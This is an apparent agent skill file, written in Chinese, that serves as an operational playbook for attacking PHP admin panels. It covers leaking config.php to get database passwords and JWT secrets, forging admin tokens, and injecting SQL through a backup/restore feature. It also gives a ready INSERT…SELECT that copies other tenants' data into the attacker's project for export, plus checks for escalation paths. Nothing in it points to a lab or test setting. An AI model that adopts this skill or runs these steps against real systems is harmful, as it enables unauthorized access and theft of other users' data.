---
name: backup-restore-sqli-exfil
description: Use when a PHP admin panel has backup/restore or export.
---

# 备份/恢复二次注入与跨租户导出

自研 PHP 管理后台（BT 面板生态、Vue SPA + 独立 backend）常把「数据备份/恢复」「批量导入/导出」做成直接拼接 SQL 的功能。把 payload 存进业务数据，再触发备份→恢复，restore 会把 dump 按 `;\n` 切开逐条执行；随后用后台自己的导出接口把跨项目数据打包带走。

## 1. 先确认三层入口

- **源码泄露**：nginx 把 `/backend/*.php` 当静态文件返回（PHP 未执行）→ 直接读 `config.php`，得 DB 口令 + `JWT_SECRET` + 备份目录。
- **JWT 伪造**：`currentUser()` 只校验 `uid` 时，用泄露密钥签 `{uid:<admin aid>, username, exp}` 即可拿管理员 API。
- **备份/恢复**：`POST /admin/backups` → `POST /admin/backups/<id>/restore`；restore 按 `;\n` 切分逐条 `exec`。

## 2. 二次注入的回显

在业务数据（如 contents）插入含 `;\n` 的记录：
```
x\n;\n<SQL>;\n--
```
备份时记录原样进 dump，restore 时 `;\n` 把 dump 切成多条语句，`<SQL>` 被执行。

- `db()->exec` 错误默认静默 → 让 `<SQL>` 自己 INSERT 一条带 marker 的记录到你能读的表，再查表回显。
- dump 按表名排序，排在你之前创建的表都已存在。
- 构造 SELECT 时 `FROM` 必须在 `CONCAT(...)` 括号外，否则 `Unknown column`（最常见的自伤）。

## 3. 跨租户搬运 + 导出

后台 `/admin/data` 通常只回当前账号名下项目。不要硬读别人的，先复制进自己项目：
```sql
INSERT INTO contents (pro_id,user_id,content_data,con_md5,is_delete,is_export,is_read,is_dy,add_time)
SELECT <my_pro>, <my_aid>, content_data, MD5(RAND()),0,0,0,0,NOW()
FROM contents WHERE pro_id <> <my_pro> AND content_data LIKE 0x252d2d2d2d25;
```
然后 `GET /admin/data/export?pro_id=<my_pro>` 拿 ZIP。先摸分布：`SELECT pro_id, COUNT(*) FROM contents GROUP BY pro_id`。

## 4. 提权前先查权限墙（省时间）

按顺序查，任一为否就别走该路：

- `information_schema.TABLES` → 1227 = 无 PROCESS
- `LOAD_FILE(...)` / `INTO OUTFILE` → 报错 = 无 FILE
- `SELECT SUPPORT FROM information_schema.ENGINES WHERE ENGINE='FEDERATED'` → NO = 不能联邦跨库
- 跨库 `SELECT` → `SELECT command denied ... for table '<t>'` = 无跨库授权

CREATE/CREATE ROUTINE 有也没用：UDF 要 FILE 写 plugin 目录。

## 5. 常见坑

- 恢复返回的「执行 N 条 SQL」可当执行旁证，但别用它判断单条 SELECT 成败。
- 备份路径受 realpath 校验（必须在 BACKUP_DIR 内），别想路径穿越读别的文件。
- 导出接口按当前登录账号的项目过滤，必须先搬运再导出。
- dump 含 DROP/CREATE，恢复会重建表，表不会无限膨胀。
- 导出 ZIP 里常是 `1.txt`（一行一条记录），字段用固定分隔符（如 `----`）——先看样本再写解析器，别假设 CSV。

脚本：`scripts/backup_sqli_copy_export.py`（摸分布→搬运→导出）。
